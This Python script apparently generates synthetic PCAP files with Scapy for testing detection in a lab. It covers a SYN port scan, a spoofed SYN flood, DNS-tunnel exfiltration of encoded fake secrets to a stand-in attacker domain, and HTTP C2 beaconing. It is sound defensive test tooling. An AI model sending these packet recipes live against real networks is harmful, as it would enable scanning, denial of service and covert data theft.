"""
Synthetic Attack Traffic Generator using Scapy.
Generates isolated PCAP files for lab validation:
- TCP SYN Port Scan (MITRE ATT&CK T1046)
- TCP SYN / UDP Flood (MITRE ATT&CK T1498.001)
- DNS Tunneling / Exfiltration simulation (MITRE ATT&CK T1071.004)
- Periodic HTTP C2 Beaconing (MITRE ATT&CK T1071.001)
"""
import os
import time
import base64
from pathlib import Path
from typing import Optional

try:
    from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, wrpcap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def generate_port_scan_pcap(
    output_path: str = "data/pcaps/attack_port_scan.pcap",
    target_ip: str = "10.0.0.1",
    src_ip: str = "192.168.1.105",
    ports: list[int] = range(20, 100)
):
    """Simulate TCP SYN port scan (MITRE ATT&CK T1046)."""
    if not SCAPY_AVAILABLE:
        print("[!] Scapy is not installed. Skipping PCAP generation.")
        return

    packets = []
    for dst_port in ports:
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=50000 + (dst_port % 1000), dport=dst_port, flags="S")
        packets.append(pkt)

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    wrpcap(output_path, packets)
    print(f"[+] Generated {len(packets)} Port Scan packets -> {output_path}")


def generate_syn_flood_pcap(
    output_path: str = "data/pcaps/attack_syn_flood.pcap",
    target_ip: str = "10.0.0.1",
    target_port: int = 80,
    packet_count: int = 500
):
    """Simulate TCP SYN Flood DoS (MITRE ATT&CK T1498.001)."""
    if not SCAPY_AVAILABLE:
        return

    packets = []
    for i in range(packet_count):
        src_ip = f"192.168.1.{(i % 200) + 10}"
        sport = 1024 + (i % 60000)
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
        packets.append(pkt)

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    wrpcap(output_path, packets)
    print(f"[+] Generated {len(packets)} SYN Flood packets -> {output_path}")


def generate_dns_tunnel_pcap(
    output_path: str = "data/pcaps/attack_dns_tunnel.pcap",
    dns_server: str = "10.0.0.53",
    src_ip: str = "192.168.1.120",
    query_count: int = 30
):
    """Simulate DNS Tunneling / Exfiltration queries (MITRE ATT&CK T1071.004)."""
    if not SCAPY_AVAILABLE:
        return

    packets = []
    fake_data = ["secret_passwords_chunk1", "financial_records_q3", "api_tokens_dump"]
    for i in range(query_count):
        chunk = fake_data[i % len(fake_data)]
        b64_chunk = base64.b32encode(f"{chunk}_{i}".encode()).decode().lower().rstrip("=")
        qname = f"{b64_chunk}.c2-exfil.attacker.corp"
        
        pkt = IP(src=src_ip, dst=dns_server) / UDP(sport=40000+i, dport=53) / DNS(rd=1, qd=DNSQR(qname=qname))
        packets.append(pkt)

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    wrpcap(output_path, packets)
    print(f"[+] Generated {len(packets)} DNS Tunnel packets -> {output_path}")


def generate_c2_beacon_pcap(
    output_path: str = "data/pcaps/attack_c2_beacon.pcap",
    c2_ip: str = "203.0.113.88",
    src_ip: str = "192.168.1.130",
    beacon_count: int = 20
):
    """Simulate periodic C2 HTTP beaconing (MITRE ATT&CK T1071.001)."""
    if not SCAPY_AVAILABLE:
        return

    packets = []
    for i in range(beacon_count):
        http_payload = (
            f"GET /heartbeat?agent_id=host-0492&seq={i} HTTP/1.1\r\n"
            f"Host: c2.apt-sim.net\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: */*\r\n\r\n"
        )
        pkt = IP(src=src_ip, dst=c2_ip) / TCP(sport=51000+i, dport=80, flags="PA") / Raw(load=http_payload)
        packets.append(pkt)

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    wrpcap(output_path, packets)
    print(f"[+] Generated {len(packets)} C2 Beacon packets -> {output_path}")


if __name__ == "__main__":
    print("Generating synthetic attack test PCAPs...")
    generate_port_scan_pcap()
    generate_syn_flood_pcap()
    generate_dns_tunnel_pcap()
    generate_c2_beacon_pcap()
    print("All synthetic attack PCAPs generated in data/pcaps/")
